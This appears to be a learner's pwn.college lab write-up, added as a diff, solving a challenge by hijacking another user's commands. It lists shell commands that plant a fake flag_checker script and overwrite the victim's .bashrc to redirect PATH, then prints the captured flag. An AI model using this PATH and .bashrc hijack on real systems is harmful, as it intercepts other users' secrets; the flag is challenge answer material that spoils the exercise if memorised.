@@ -33,3 +33,28 @@ This time, Zardus doesn't keep the flag lying around in a readable file after he
 
 Your mission is to use your continued write access to Zardus's .bashrc to intercept this flag. Remember how you hijacked commands in the Pondering PATH module? Can you use that capability to hijack the flag_checker?
 
+### Solve
+**Flag:** `pwn.college{MUm7XEjegUOaqY9st_Mmpp1XaKz.0VNzEzNxwCN2gjNzEzW}`
+
+I was stuck because I entered the wrong path to the PATH variable. After I changed it to hacker's home directory which was where I created the fake flag_checker file, it worked.
+```
+hacker@shenanigans~sniffing-input:~$ touch flag_checker
+hacker@shenanigans~sniffing-input:~$ echo 'read -p "Type the flag" flag' > flag_checker
+hacker@shenanigans~sniffing-input:~$ echo 'echo $flag' >> flag_checker
+hacker@shenanigans~sniffing-input:~$ chmod a+x flag_checker
+hacker@shenanigans~sniffing-input:~$ echo 'PATH=/home/hacker' > /home/zardus/.bashrc
+hacker@shenanigans~sniffing-input:~$ /challenge/victim
+Username: zardus
+Password: ***********
+zardus@shenanigans~sniffing-input:~$ flag_checker
+Type the flag*************************************************************pwn.college{MUm7XEjegUOaqY9st_Mmpp1XaKz.0VNzEzNxwCN2gjNzEzW}
+zardus@shenanigans~sniffing-input:~$ exit
+logout
+```
+
+### New Learnings
+I practiced hijacking files and .bashrc to redirect the PATH.
+
+### References
+
+## 
